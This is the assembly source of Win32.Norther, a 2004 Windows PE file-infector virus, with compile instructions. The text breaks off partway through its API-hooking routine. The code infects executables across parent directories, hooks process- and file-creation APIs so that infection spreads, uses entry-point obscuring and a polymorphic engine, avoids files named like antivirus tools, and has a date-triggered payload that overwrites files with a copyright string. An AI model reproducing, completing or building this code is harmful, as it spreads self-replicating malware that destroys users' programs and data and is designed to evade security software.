;
;	Win32.Norther By DR-EF (c) 2004
;	-------------------------------
;
;	Virus Name:Win32.Norther
;	Size:8k
;	Type:PE Infector
;	Author:DR-EF
;
;
;	Virus Features:
;	---------------
;	- Infect Files At 20 upper directorys level using 
;         the dot dot method
;
;	- 2 methods of infection: .reloc section overwriting
;	  or append to last section
;
;	- use size padding to mark infected files
;
;	- E.P.O,the virus patch the mov eax,fs:[00000000]
;	  instruction with call virus_decryptor & inc ebx
;	  instead of modifly entry point
;
;	- Per Process Residenty,Norther hook the WinExec,
;         CreateProcess,SetCurrectDirectory,CreateFile apis
;	  and infect files when this apis called
;
;	- Dont Infect SFC protected files & files that have
;	  name like av software
;
;	- Norther Polymorphic\Encrypted using the Voltage
;	  polymorphic engine version 2.0
;
;	How To Compile:
;	---------------
;	tasm32 /m3 /ml /zi Norther.asm , , ;
;	tlink32 /tpe /aa /v Norther , Norther,,import32.lib
;	pewrsec Norther.exe
;	
;
;



.386
.model flat

		DEBUG		equ	0
		VirusSize	equ	(VirusEnd-VirusStart)
		extrn		ExitProcess:proc
		extrn		GetModuleHandleA:proc
		extrn		MessageBoxA:proc
		
.data

	db	?
	
.code



Norther:
	mov	eax,VirusSize
	push	offset FirstGen	
	pushad	
	jmp	FG
	VirusStart		equ	$
	mov	esp,[esp + 8h]
	pop	dword ptr fs:[0]
	add	esp,0ch					;restore stack
FG:	call	Delta					;get delta offset
Delta:	pop	ebp
	sub	ebp,offset Delta
	mov	eax,400000h				;host image base
	HostImageBase		equ	($-VirusStart-4)
	HostImageBase_		equ	($-4)
	push	eax					;save image base in the stack
	add	eax,[eax + 3ch]				;goto pe header offset
	add	eax,80h					;goto import data directory
	mov	eax,[eax]				;get it rva
	add	eax,[esp]				;convert it to va
@_Dll:	mov	esi,[eax + 0ch]				;get rva to dll name
	cmp	esi,0h					;no more imported dlls ?
	je	ReturnToHost
	add	esi,[esp]				;convert it to va
	mov	ecx,8h
	call	OverK32
	db	"KERNEL32"
OverK32:pop	edi
	rep	cmpsb					;compare dll name
	je	_____1
	add	eax,14h					;move to next IMAGE_IMPORT_DESCRIPTOR
	jmp	@_Dll					;structure
_____1:	mov	esi,[eax]				;get rva to pointers to image import by name structures	
	add	esi,[esp]				;convert it to va
	xor	edx,edx
@NxtApi:push	edx					;save loop index
	push	esi					;save pointer to structures
	mov	esi,[esi]				;get import by name structure rva
	add	esi,[esp + 8h]				;convert it to va
	add	esi,2h					;skip the IBN_Hint
	call	OverGMH
	db	"GetModuleHandleA"	
OverGMH:pop	edi
	mov	ecx,10h
	rep	cmpsb					;compare api name
	je	GetAddr
	pop	esi
	pop	edx
	add	edx,4h
	add	esi,4h
	jmp	@NxtApi
GetAddr:pop	esi
	pop	edx					;get loop index
	mov	esi,[eax + 10h]				;get rva to name
	add	esi,[esp]				;convert it to va
	add	esi,edx					;goto GetModuleHandleA api address
	pop	eax					;restore stack
	mov	eax,[esi]				;eax - GetModuleHandleA api address !
	call	Over_K32
	db	"Kernel32.dll",0
Over_K32:
	call	eax					;get kernel32 image base
	or	eax,eax					;fail ?
	je	ReturnToHost
	push	eax					;save kernel32 image base in the stack
	add	eax,[eax + 3ch]
	mov	eax,[eax + 78h]
	add	eax,[esp]				;eax - kernel32 export table
	push	eax
	xor	edx,edx
	mov	eax,[eax + 20h]
	add	eax,[esp + 4h]
	mov	edi,[eax]
	add	edi,[esp + 4h]				;edi - api names array
	dec	edi
NxtCmp:	inc	edi
	call	OverGPA
	db	"GetProcAddress",0
OverGPA:pop	esi
	mov	ecx,0eh
	rep	cmpsb
	je	GetGPA
	inc	edx
Nxt_1:	cmp	byte ptr [edi],0h
	je	NxtCmp
	inc	edi
	jmp	Nxt_1
GetGPA:	pop	eax					;eax - kernel32 export table
	shl	edx,1h					;edx - GetProcAddress position
	mov	ebx,[eax + 24h]
	add	ebx,[esp]
	add	ebx,edx
	mov	dx,word ptr [ebx]
	shl	edx,2h
	mov	ebx,[eax + 1ch]
	add	ebx,[esp]
	add	ebx,edx
	mov	ebx,[ebx]
	add	ebx,[esp]
	mov	[ebp + GetProcAddress],ebx
	mov	ecx,NumberOfApis
	call	OverNames
	
	db	"CreateFileA",0
	db	"CloseHandle",0
	db	"CreateFileMappingA",0
	db 	"MapViewOfFile",0
	db 	"UnmapViewOfFile",0
	db	"FindFirstFileA",0
	db	"FindNextFileA",0
	db	"FindClose",0
	db	"SetCurrentDirectoryA",0
	db	"GetCurrentDirectoryA",0
	db	"GetFileSize",0
	db	"SetFilePointer",0
	db	"SetEndOfFile",0
	db	"GetTickCount",0
	db	"LoadLibraryA",0
	db	"MultiByteToWideChar",0
	db	"GetFullPathNameA",0
	db	"GetSystemTime",0
	
OverNames:
	pop	eax
	Call	OverAddresses
	
	
	CreateFile		dd	0
	CloseHandle		dd	0
	CreateFileMapping	dd	0
	MapViewOfFile		dd 	0
	UnmapViewOfFile		dd 	0
	FindFirstFile		dd	0
	FindNextFile		dd	0
	FindClose		dd	0
	SetCurrentDirectory	dd	0
	GetCurrentDirectory	dd	0
	GetFileSize		dd	0
	SetFilePointer		dd	0
	SetEndOfFile		dd	0
	GetTickCount		dd	0
	LoadLibrary		dd	0
	MultiByteToWideChar	dd	0
	GetFullPathName		dd	0
	GetSystemTime		dd	0
	
	NumberOfApis		equ	18
	
	
	GetProcAddress		dd	0
	
	CopyRight	db	"Win32.Norther (c) 2004 DR-EF"
		
OverAddresses:
	pop	ebx
	pop	edx
NextAPI:push	ecx
	push	edx
	push	eax
	push	eax
	push	edx
	call	[ebp + GetProcAddress]
	cmp	eax,0h
	jne	SaveIt
	add	esp,0ch
	jmp	ReturnToHost
SaveIt:	mov	dword ptr [ebx],eax
	pop	eax
NextSTR:inc	eax
	cmp	byte ptr [eax],0h
	jne	NextSTR
	inc	eax
	add	ebx,4h
	pop	edx
	pop	ecx
	loop	NextAPI
	;check for payload
	lea	eax,[ebp + SYSTEMTIME]
	push	eax
	call	[ebp + GetSystemTime]
	cmp	word ptr [ebp + wMonth],0ch
	jne	skp_p
	cmp	word ptr [ebp + wDay],1dh
	jne	skp_p
	inc	byte ptr [ebp + active_payload]
	mov	dword ptr [ebp + SearchMask + 1],"lld."	;bye bye *.dll
skp_p:	;get SfcIsProtectedFile API
	mov	dword ptr [ebp + SfcIsFileProtected],0
	call	OverSfc
	db	"SFC.DLL",0
OverSfc:call	[ebp + LoadLibrary]			;load sfc.dll
	or	eax,eax
	je	NoSFC
	call	OvrSfc
	db      "SfcIsFileProtected",0
OvrSfc:	push	eax
	call	[ebp + GetProcAddress]			;get SfcIsFileProtected api
	or	eax,eax
	je	NoSFC
	mov	dword ptr [ebp + SfcIsFileProtected],eax
NoSFC:	lea	eax,[ebp + CurrentDirectory]		;we finish to get apis,now lets infect
	push	eax					;files in the currect & upper directorys
	push	0ffh
	call	[ebp + GetCurrentDirectory]
	cmp	eax,0h
	je	HookApis
	call	InfectDirectory
	lea	eax,[ebp + CurrentDirectory]
	push	eax
	call	[ebp + SetCurrentDirectory]
HookApis:
	;hook	winexec
	mov	eax,dword ptr [ebp + HostImageBase_]
	lea	ebx,[ebp + Hook_Dll1]
	lea	ecx,[ebp + Win_execfn]
	lea	edx,[ebp + WinExecHook]
	call	HookApi
	mov	dword ptr [ebp + WinExec_addr],eax
	;hook	CreateFileA
	mov	eax,dword ptr [ebp + HostImageBase_]
	lea	ebx,[ebp + Hook_Dll1]
	lea	ecx,[ebp + CreateFile_fn]
	lea	edx,[ebp + CreateFile_Hook]
	call	HookApi
	mov	dword ptr [ebp + CreateFile_addr],eax
	;hook	CreateProcessA
	mov	eax,dword ptr [ebp + HostImageBase_]
	lea	ebx,[ebp + Hook_Dll1]
	lea	ecx,[ebp + CreateProcess_fn]
	lea	edx,[ebp + CreateProcess_Hook]
	call	HookApi
	mov	dword ptr [ebp + CreateProcess_addr],eax
	;hook	SetCurrentDirectory
	mov	eax,dword ptr [ebp + HostImageBase_]
	lea	ebx,[ebp + Hook_Dll1]
	lea	ecx,[ebp + SetCurrentDirectory_fn]
	lea	edx,[ebp + SetCurrentDirectory_Hook]
	call	HookApi
	mov	dword ptr [ebp + SetCurrentDirectory_addr],eax
ReturnToHost:
	popad
	db	64h,0a1h,0,0,0,0	;mov eax,fs:[00000000]
	dec	ebx
	ret
	
	
	SYSTEMTIME:
		wYear	dw	0
		wMonth	dw	0
		wDayOfWeek	dw	0
		wDay	dw	0
		wHour	dw	0
		wMinute	dw	0
		wSecond	dw	0
		wMilliseconds	dw	0


Payload:						;the "Payload" !
IF	DEBUG
	int	3
ENDIF
	lea	ebx,[ebp + cFileName]
	call	OpenFile
	lea	esi,[ebp + CopyRight]
	xchg	edi,eax
	mov	ecx,29ah
	rep	movsb
	mov	dword ptr [ebp + FileSize],29ah
	call	RestoreFile
	call	CloseFile
	ret

	active_payload	db	0

;--------------- api hooks --------------------------



WinExecHook:
IF	DEBUG
	int	3
ENDIF
	pushad
	pushfd
	call	HookD
HookD:	pop	ebp
	sub	ebp,offset HookD
	mov	esi,[esp + 28h]
	call	CheckFileName
	jc	SkipFile1
	mov	ebx,[esp + 28h]
	call	InfectFile	
SkipFile1:
	popfd
	popad
	push	ebp
	call	Hook_D
Hook_D:	pop	ebp
	sub	ebp,offset Hook_D
	xchg	eax,ebp
	pop	ebp
	jmp	dword ptr [eax + WinExec_addr]
	
	
	WinExec_addr	dd	0
	Win_execfn	db	"WinExec",0
	


CreateFile_Hook:
IF	DEBUG
	int	3
ENDIF
	pushad
	pushfd
	call	HookD4
HookD4:	pop	ebp
	sub	ebp,offset HookD4
	xor	ecx,ecx
	mov	esi,[esp + 28h]
NxtByte:cmp	byte ptr [esi],0h
	je	GetDir
	inc	ecx
	inc	esi
	jmp	NxtByte
GetDir:	mov	esi,[esp + 28h]
	add	esi,ecx
@NxtByt:dec	esi
	dec	ecx
	cmp	byte ptr [esi],'\'
	jne	@NxtByt
	mov	esi,[esp + 28h]
	lea	edi,[ebp + CurrentDirectory]
	rep	movsb
	lea	eax,[ebp + CurrentDirectory]
	push	eax
	call	[ebp + SetCurrentDirectory]
	call	InfectDirectory	
	popfd
	popad
	push	ebp
	call	Hook_D4
Hook_D4:pop	ebp
	sub	ebp,offset Hook_D4
	xchg	eax,ebp
	pop	ebp
	jmp	dword ptr [eax + CreateFile_addr]

	CreateFile_addr	dd	0
	CreateFile_fn	db	"CreateFileA",0
	

CreateProcess_Hook:
IF	DEBUG
	int	3
ENDIF
	pushad
	pushfd
	call	HookD3
HookD3:	pop	ebp
	sub	ebp,offset HookD3
	mov	esi,[esp + 28h]
	call	CheckFileName
	jc	SkipFile2
	mov	ebx,[esp + 28h]
	call	InfectFile
SkipFile2:
	popfd
	popad
	push	ebp
	call	Hook_D3
Hook_D3:pop	ebp
	sub	ebp,offset Hook_D3
	xchg	eax,ebp
	pop	ebp
	jmp	dword ptr [eax + CreateProcess_addr]
	

	CreateProcess_addr	dd	0
	CreateProcess_fn	db	"CreateProcessA",0
	


SetCurrentDirectory_Hook:
IF	DEBUG
	int	3
ENDIF	
	pushad
	pushfd
	call	HookD2
HookD2:	pop	ebp
	sub	ebp,offset HookD2
	push	dword ptr [esp+28h]
	call	[ebp + SetCurrentDirectory]
	call	InfectDirectory
	popfd
	popad
	push	ebp
	call	Hook_D2
Hook_D2:pop	ebp
	sub	ebp,offset Hook_D2
	xchg	eax,ebp
	pop	ebp
	jmp	dword ptr [eax + SetCurrentDirectory_addr]



	SetCurrentDirectory_addr	dd	0
	SetCurrentDirectory_fn		db	"SetCurrentDirectoryA",0


	
	Hook_Dll1	db	"KERNEL32",0



;------------------------------------------------------


;infect files in 20 directorys level(upper),	
;input:
;currect directory already setted
InfectDirectory:
	mov	byte ptr [ebp + DirLevel],0h		;init the directory level counter
Nextdir:cmp	byte ptr [ebp + DirLevel],14h
	je	ExitSearch
	lea	eax,[ebp + WIN32_FIND_DATA]
	push	eax
	call	OverSM
SearchMask	equ	$
	db	"*.exe",0
OverSM:	call	[ebp + FindFirstFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	nxt_dir
	mov	[ebp + hfind],eax
i_file:	cmp	byte ptr [ebp + active_payload],1h
	jne	skip_p
	call	Payload	
skip_p:	mov	eax,[ebp + nFileSizeLow]
	call	PadSize
	cmp	edx,0h					;already infected ?
	je	skipf
	lea	esi,[ebp + cFileName]
	call	CheckFileName
	jnc	skipf
	lea	ebx,[ebp + cFileName]
	call	InfectFile
skipf:	lea	eax,[ebp + WIN32_FIND_DATA]
	push	eax
	push	[ebp + hfind]
	call	[ebp + FindNextFile]
	or	eax,eax
	jne	i_file
nxt_dir:inc	[ebp + DirLevel]
	call	OverDD
	db	"..",0
OverDD:	call	[ebp + SetCurrentDirectory]
	or	eax,eax
	jne	Nextdir
ExitSearch:
	ret
	
	DirLevel	db	0h
	hfind		dd	0
	CurrentDirectory	db	0ffh	dup(0)
	
	WIN32_FIND_DATA:
		dwFileAttributes	dd	0
		ftCreationTime		dq	0
		ftLastAccessTime	dq	0
		ftLastWriteTime		dq	0
		nFileSizeHigh		dd	0
		nFileSizeLow		dd	0
		dwReserved0		dd      0
		dwReserved1		dd      0
		cFileName		db      0ffh	dup (0)
		cAlternateFileName	db	14h	dup (0)
	
	INVALID_HANDLE_VALUE	equ	-1
	
	
;ebx - file name
InfectFile:
IF	DEBUG
	int	3
ENDIF
	pushad
	lea	eax,[ebp + Infection_Err_Handler]
	push	eax
	xor	eax,eax
	push	dword ptr fs:[eax]		;set SEH to protect infection function
	mov	fs:[eax],esp
	;check for SFC!
	cmp	[ebp + SfcIsFileProtected],0h	;there is sfc api ?
	je	Sfc_Ok
	push	ebx				;save file name
	mov	ecx,0ffh			;(1024/4)
	xor	eax,eax
	lea	edi,[ebp + FullPath]
	rep	stosd				;blank buffers
	lea	eax,[ebp + File_Name]
	push	eax
	lea	eax,[ebp + FullPath]
	push	eax
	push	260
	push	ebx
	call	[ebp + GetFullPathName]		;get file full path
	or	eax,eax
	jne	GetUnic
	pop	ebx
	jmp	ExitInfect
GetUnic:push	260
	lea	eax,[ebp + UnicodePath]
	push	eax
	push	-1				;string is null terminated
	lea	eax,[ebp + FullPath]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	call	[ebp + MultiByteToWideChar]	;convert path into unicode
	or	eax,eax
	jne	CheckSFC
	pop	ebx
	jmp	ExitInfect
CheckSFC:	
	lea	eax,[ebp + UnicodePath]
	push	eax
	push	0h
	call	[ebp + SfcIsFileProtected]	;check if the file protected:
	or	eax,eax
	je	No_Protect
	pop	ebx
	jmp	ExitInfect
No_Protect:
	pop	ebx				;restore file name
Sfc_Ok:
	;open file !
	call	OpenFile			;open & map the file
	jnc	ExitInfect
	cmp	word ptr [eax],"ZM"		;check mz sign
	jne	InfectErr
	add	eax,[eax + 3ch]
	cmp	word ptr [eax],"EP"		;check pe sign
	jne	InfectErr
	cmp	word ptr [eax + 04h],14Ch	;infect only intel 386
	jne	InfectErr
	mov	dx,word ptr [eax + 16h]
	and	dx,2000h
	cmp	dx,2000h			;dont infect dlls
	je	InfectErr
	push	eax				;save pe header in the stack
	;check if the program import the GetModuleHandleA api,which we most need it
	cmp	dword ptr [eax+80h],0h		;the program has imports ?
	jne	Import_
	pop	eax				;restore stack
	jmp	InfectErr	
Import_:mov	edx,[eax + 80h]			;get rva to import section
	xor	ecx,ecx
	mov	cx,[eax + 6h]			;get number of sections
	mov	ebx,[eax + 74h]			;get number of data directorys
	shl	ebx,3h
	add	eax,ebx
	add	eax,78h				;goto first section body
FindImp:cmp	dword ptr [eax + 0ch],edx	;compare section rva,with import section rva
	je	_Import
	add	eax,28h				;goto next section	
	loop	FindImp	
	pop	eax				;restore stack
	jmp	InfectErr			;some thing went wrong.
_Import:mov	eax,[eax + 14h]			;get pointer to raw data rva
	add	eax,[ebp + mapbase]		;convert it to va
	push	eax				;save import section start
@NxtDLL:mov	ebx,[eax + 0ch]			;get dll name rva
	cmp	ebx,0h				;no more dlls ?
	jne	____3				
	add	esp,8h				;restore stack
	jmp	InfectErr
____3:	sub	ebx,edx
	add	ebx,[esp]			;convert it to va
	mov	edi,ebx				
	mov	ecx,8h
	call	OverK32_
	db	"KERNEL32"
OverK32_:
	pop	esi
	rep	cmpsb
	je	____2
	add	eax,14h
	jmp	@NxtDLL
____2:	mov	esi,[eax]			;get rva to pointers to image import by name structures	
	sub	esi,edx
	add	esi,[esp]			;convert it to va
NextApi:push	esi				;save pointer to IBN structures
	mov	edi,[esi]
	sub	edi,edx
	add	edi,[esp + 4h]
	add	edi,2h				;skip the IBN_Hint
	call	_GMH
	db	"GetModuleHandleA"
_GMH:	pop	esi
	mov	ecx,10h
	rep	cmpsb
	je	GMH_Ok	
	pop	esi
	add	esi,4h
	cmp	dword ptr [esi],0h
	jne	NextApi
	add	esp,0ch
	jmp	InfectErr
	
GMH_Ok:	add	esp,8h				;restore stack	
	;check if the code section has enough space for the decryptor
	mov	eax,[esp]			;get pe header
	xor	ecx,ecx
	mov	cx,[eax + 6h]			;get number of sections
	mov	ebx,[eax + 74h]			;get number of data directorys
	shl	ebx,3h
	add	eax,ebx
	add	eax,78h				;eax - first section header
@NS:	mov	ebx,[eax + 24h]			;get section flags
	and	ebx,20h
	cmp	ebx,20h
	je	_CheckS
	add	eax,28h				;move to next section
	loop	@NS
_CheckS:mov	ebx,[eax + 10h]			;get size of raw data
	sub	ebx,[eax + 8h]			;sub from it the virtual size
	cmp	ebx,0beh			;free space most be at least 190 bytes
	ja	SpaceOk
	pop	eax
	jmp	InfectErr
SpaceOk:mov	ebx,[eax + 14h]			;get pointer to raw data
	add	ebx,[eax + 8h]			;add the virtual size to it
	add	ebx,[ebp + mapbase]		;add the mapbase
	mov	[ebp + WhereToWriteDecryptor],ebx
	push	dword ptr [eax + 8h]
	push	dword ptr [eax + 10h]		;push size of raw data
	pop	dword ptr [eax + 8h]		;overwrite virtual size with it
	;patch instruction in the code section
	push	eax
	mov	ecx,100h
	mov	eax,[esp + 8h]			;get pe header
	mov	eax,[eax + 28h]			;get entry point
	add	eax,[ebp + mapbase]		;goto entry point
	call	ScanAndPatch
	jnc	ScanAll
	add	esp,8h				;restore stack
	jmp	Patch_OK
ScanAll:pop	eax
	pop	ecx				;get virtual size
	mov	eax,[eax + 14h]
	add	eax,[ebp + mapbase]
	call	ScanAndPatch			;replace mov eax,fs:[00000000] with call virus
	jc	Patch_OK
	pop	eax
	jmp	InfectErr
Patch_OK:
	;check if the program has .reloc section,and if it has enough space for the virus
	mov	byte ptr [ebp + RelocInfection],0h
	mov	eax,[esp]			;get pe header
	cmp	dword ptr [eax + 0a0h],0h	;there is reloc section ?
	je	LastSection
	mov	edx,[eax + 0a0h]		;get rva to .reloc section
	mov	eax,[esp]			;get pe header
	xor	ecx,ecx
	mov	cx,[eax + 6h]			;get number of sections
	mov	ebx,[eax + 74h]			;get number of data directorys
	shl	ebx,3h
	add	eax,ebx
	add	eax,78h				;eax - first section header	
@F_RLC:	mov	ebx,[eax + 0ch]			;get virtual address
	cmp	ebx,edx
	je	CheckReloc	
	add	eax,28h	
	loop	@F_RLC
	jmp	LastSection			;error,try last section method
CheckReloc:
	cmp	dword ptr [eax + 10h],VirusSize	;compare size of raw data with virus size
	jb	LastSection
	push	dword ptr [eax + 10h]
	pop	dword ptr [eax + 8h]		;fix section size
	or	dword ptr [eax + 24h],0c0000020h;set section flags to code\readable\writeable
	push	eax					
	mov	ebx,eax
	mov	[ebp + FixRVA],0		;add VirtualSize-PointerToRawData
	mov	eax,[ebx + 0ch]			;subtraction to the virus offset
	sub	eax,[ebx + 14h]			;when decrypting and jumping to
	mov	[ebp + FixRVA],eax		;virus at runtime.
	pop	eax
	mov	edi,[eax + 14h]
	add	edi,[ebp + mapbase]
	mov	[ebp + StartOfDataToEncrypt],edi
	push	edi				;save virus offset in infected file
	lea	esi,[ebp + VirusStart]
	mov	ecx,VirusSize
	rep	movsb				;copy virus into host
	mov	eax,[esp+4h]			;get pe header
	mov	dword ptr [eax + 0a0h],0h	;clear relocation data directory
	mov	dword ptr [eax + 0a4h],0h
	inc	byte ptr [ebp + RelocInfection]
	jmp	FixPE
LastSection:
	mov	eax,[esp]			;get pe header
	xor	ecx,ecx
	mov	cx,[eax + 6h]			;get number of sections
	dec	ecx
	mov	ebx,[eax + 74h]			;get number of data directorys
	shl	ebx,3h
	add	eax,ebx
	add	eax,78h				;eax - first section		
@Ls:	add	eax,28h				;move to next section
	loop	@Ls
	or	dword ptr [eax + 24h],0c0000020h;set section flags to code\readable\writeable
	push	dword ptr [eax + 8h]		;save virtual size
	add	dword ptr [eax + 8h],VirusSize	;add virus size to section virtual size
	xchg	eax,ebx
	mov	eax,[ebx + 8h]			;get section new virtual size
	mov	ecx,dword ptr [esp+4h]		;get pe header
	mov	ecx,[ecx + 3ch]			;get file alignment
	push	eax				;\
	xor	edx,edx				; \
	div	ecx				;-->align section size
	sub	ecx,edx				; /
	pop	dword ptr [ebx + 10h]		;/
	add	dword ptr [ebx + 10h],ecx	;set new section size of raw data
	mov	[ebp + FixRVA],0		;add VirtualSize-PointerToRawData
	mov	eax,[ebx + 0ch]			;subtraction to the virus offset
	sub	eax,[ebx + 14h]			;when decrypting and jumping to
	mov	[ebp + FixRVA],eax		;virus at runtime.
	pop	edi
	add	edi,[ebx + 14h]			;get pointer to raw data
	add	edi,[ebp + mapbase]
	mov	[ebp + StartOfDataToEncrypt],edi
	push	edi				;save virus offset in infected files
	lea	esi,[ebp + VirusStart]
	mov	ecx,VirusSize
	rep	movsb				;copy virus to the host
FixPE:	;fix size of image in pe header & image base in the virus
	cmp	byte ptr [ebp + RelocInfection],0h
	je	_FixVir
	mov	ebx,[esp+4h]			;get pe header
	mov	eax,[ebx + 50h]			;get size of image
	add	eax,VirusSize
	push	eax
	xor	edx,edx
	mov	ecx,[ebx + 38h]			;get section alignment
	div	ecx
	sub	ecx,edx
	pop	eax
	add	eax,ecx				;align size of image
	mov	dword ptr [ebx + 50h],eax	;set new size of image
_FixVir:pop	edi				;restore virus offset in infected file
	pop	esi				;get pe header
	mov	eax,[esi + 34h]			;get image base
	mov	[edi + HostImageBase],eax	;set image base in the virus
	;encrypt it & write polymorphic decryptor
	mov	[ebp + ProgramImageBase],eax	;set image base in the decryptor
	call	CreateDecryptor
	;close the file
	cmp	byte ptr [ebp + RelocInfection],0h
	je	_CloseF
	mov	eax,dword ptr [ebp + FileSize]
	call	PadSize
	push	FILE_BEGIN
	push	0h
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + SetFilePointer]
	push	dword ptr [ebp + hfile]
	call	[ebp + SetEndOfFile]
	call	CloseFile
	jmp	ExitInfect
_CloseF:
	call	PadFileSize
	call	CloseFile
ExitInfect:
	pop	dword ptr fs:[0]
	add	esp,4h
	popad
	ret
InfectErr:
	call	RestoreFile
	call	CloseFile
	pop	dword ptr fs:[0]	
	add	esp,4h
	popad
	ret

Infection_Err_Handler:
	mov	esp,[esp + 8h]
	pop	dword ptr fs:[0]	
	add	esp,4h
	popad
	ret


	SfcIsFileProtected	dd	0
	File_Name		dd	0
	FullPath	db	520	dup(0)
	UnicodePath	db	520	dup(0)		


;scan a code for mov eax,fs:[00000000] instruction and 
;patch it with call virus_decryptor and inc ebx instruction
;input:
;eax - address of code
;ecx - size of code to scan
;output:
;carry flag - success\fail.
ScanAndPatch:
__1:	cmp	word ptr [eax],0a164h
	jne	nxt_w
	cmp	dword ptr [eax + 2h],0
	jne	nxt_w
	mov	byte ptr [eax],0e8h		;call instruction
	mov	ebx,[ebp + WhereToWriteDecryptor]
	push	eax
	sub	eax,[ebp + mapbase]
	sub	ebx,eax
	sub	ebx,5h
	sub	ebx,[ebp + mapbase]
	pop	eax
	mov	dword ptr [eax + 1h],ebx
	mov	byte ptr [eax + 5h],43h		;inc ebx instruction
	jmp	patchok				;patch only one time.
nxt_w:	inc	eax
	loop	__1
	jmp	nopatch
patchok:stc
	ret
nopatch:clc
	ret


;check if file is related to programms that has checksum protection or canot be infected
;input:
;esi - file name
;output:
;carry flag

CheckFileName:
	xor	ecx,ecx
@checkV:cmp	byte ptr [esi + ecx],'v'
	je	badfile
	cmp	byte ptr [esi + ecx],'V'
	je	badfile
	cmp	byte ptr [esi + ecx],0h
	je	no_v
	inc	ecx
	jmp	@checkV
no_v:	push	esi			;save file name for later use
	mov	ecx,TwoBytesNames	;scan for 2 bytes bad name
	lea	edi,[ebp + DontInfectTable]
l2:	mov	bx,word ptr [edi]
l2_1:	mov	ax,word ptr [esi]
	cmp	ax,bx
	je	ex_rs
	add	bx,2020h
	cmp	ax,bx
	je	ex_rs
	sub	bx,2020h
	inc	esi
	cmp	byte ptr [esi],0h
	jne	l2_1
	mov	esi,[esp]		;restore file name	
	add	edi,2h
	loop	l2
	mov	ecx,FourBytesNames	;scan for 4 bytes bad name
	lea	edi,[ebp + DontInfectTable + (2*TwoBytesNames)]
	mov	esi,[esp]		;get file name
l3:	mov	ebx,dword ptr [edi]
l3_1:	mov	eax,dword ptr [esi]
	cmp	eax,ebx
	je	ex_rs
	add	ebx,20202020h
	cmp	eax,ebx
	je	ex_rs
	sub	ebx,20202020h
	inc	esi
	cmp	byte ptr [esi],0h
	jne	l3_1
	mov	esi,[esp]
	add	edi,4h
	loop	l3
	pop	esi
	stc
	ret
ex_rs:	pop	esi
badfile:clc
	ret
	
DontInfectTable:

	db	"FP"
	db	"TB"
	db	"AW"
	db	"DR"
	db	"F-"
	TwoBytesNames	equ	5
	db	"INOC"
	db	"PAND"
	db	"ANTI"
	db	"AMON"
	db	"N32S"
	db	"NOD3"
	db	"NPSS"
	db	"SMSS"
	db	"SCAN"
	db	"ZONE"
	db	"PROT"
	db	"MONI"
	db	"RWEB"
	db	"MIRC"
	db	"CKDO"
	db	"TROJ"
	db	"SAFE"
	db	"JEDI"
	db	"TRAY"		
	db	"ANDA"	
	db	"SPID"		
	db	"PLOR"
	db	"NDLL"		
	db	"TREN"
	db	"NSPL"
	db	"NSCH"
	db	"ALER"
	
	FourBytesNames	equ	27
	




;open & map a file into the memory:
;input:
;	ebx - filename
;output
;	carry flag
OpenFile:
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	push	ebx	
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	OpenFileErr
	mov	dword ptr [ebp + hfile],eax
	push	0h
	push	eax
	call	[ebp + GetFileSize]
	cmp	eax,0ffffffffh
	je	FileSizeErr
	mov	dword ptr [ebp + FileSize],eax
	call	PadSize
	cmp	edx,0h
	je	FileSizeErr				;already infected
	xor	eax,eax
	push	eax
	push	dword ptr [ebp + FileSize]
	add	dword ptr [esp],VirusSize
	push	eax
	push	PAGE_READWRITE
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + CreateFileMapping]
	cmp	eax,0h
	je	FileSizeErr
	mov	dword ptr [ebp + hmap],eax
	push	dword ptr [ebp + FileSize]
	add	dword ptr [esp],VirusSize
	xor	eax,eax
	push	eax
	push	eax
	push	FILE_MAP_WRITE
	push	dword ptr [ebp + hmap]
	call	dword ptr [ebp + MapViewOfFile]
	cmp	eax,0h
	je	FileMapErr
	mov	dword ptr [ebp + mapbase],eax
	stc
	ret
FileMapErr:
	push	[ebp + hmap]
	call	[ebp + CloseHandle]
FileSizeErr:
	push	[ebp + hfile]
	call	[ebp + CloseHandle]
OpenFileErr:
	clc
	ret
	

CloseFile:
	push	dword ptr [ebp + mapbase]
	call	[ebp + UnmapViewOfFile]
	push	dword ptr [ebp + hmap]
	call	[ebp + CloseHandle]
	push	dword ptr [ebp + hfile]
	call	[ebp + CloseHandle]
	ret

RestoreFile:
	xor	eax,eax
	push	eax
	push	eax					;FILE_BEGIN
	push	dword ptr [ebp + FileSize]
	push	dword ptr [ebp + hfile]
	call	[ebp + SetFilePointer]
	push	dword ptr [ebp + hfile]
	call	[ebp + SetEndOfFile]
	ret
	
	
PadFileSize:
	mov	eax,dword ptr [ebp + FileSize]
	add	eax,VirusSize
	call	PadSize
	push	FILE_BEGIN
	push	0h
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + SetFilePointer]
	push	dword ptr [ebp + hfile]
	call	[ebp + SetEndOfFile]
	ret	

	
	hfile			dd	0
	hmap			dd	0
	mapbase			dd	0
	FileSize		dd	0
	RelocInfection		db	0
	
	
	
	CreationTime		dq	0
	LastAccessTime		dq	0
	LastWriteTime		dq	0
	
	
	
	FILE_ATTRIBUTE_NORMAL	equ	00000080h
	OPEN_EXISTING		equ	3
	GENERIC_READ		equ	80000000h
	GENERIC_WRITE		equ	40000000h
	INVALID_HANDLE_VALUE	equ	-1
	PAGE_READWRITE		equ	4h
	FILE_MAP_WRITE		equ	00000002h
	FILE_BEGIN		equ	0

;pad size by 101
;input:
;	eax - size
;output:
;	eax - new size
;	edx - reminder
PadSize:
	push	eax
	xor	edx,edx
	mov	ecx,65h	;101d
	div	ecx
	cmp	edx,0h
	je	NoPad
	sub	ecx,edx
	xchg	ecx,edx
NoPad:	pop	eax
	add	eax,edx
	ret


;input:
;eax - image base
;ebx - dll name
;ecx - function name
;edx - hook procedure
;output
;eax - new function address or 0 if fail	
HookApi:
	cmp	word ptr [eax],"ZM"		;check mz sign
	jne	HookErr
	push	eax				;save image base in the stack
	add	eax,[eax + 3ch]			;goto pe header
	add	eax,80h
	mov	eax,[eax]			;get import section rva
	cmp	eax,0h
	je	HookErr_
	add	eax,[esp]			;convert it to va
@Dll:	mov	esi,[eax + 0ch]
	cmp	esi,0h
	je	HookErr_	
	add	esi,[esp]			;esi - dll name
	;compare the dll name in [esi],with our dll:
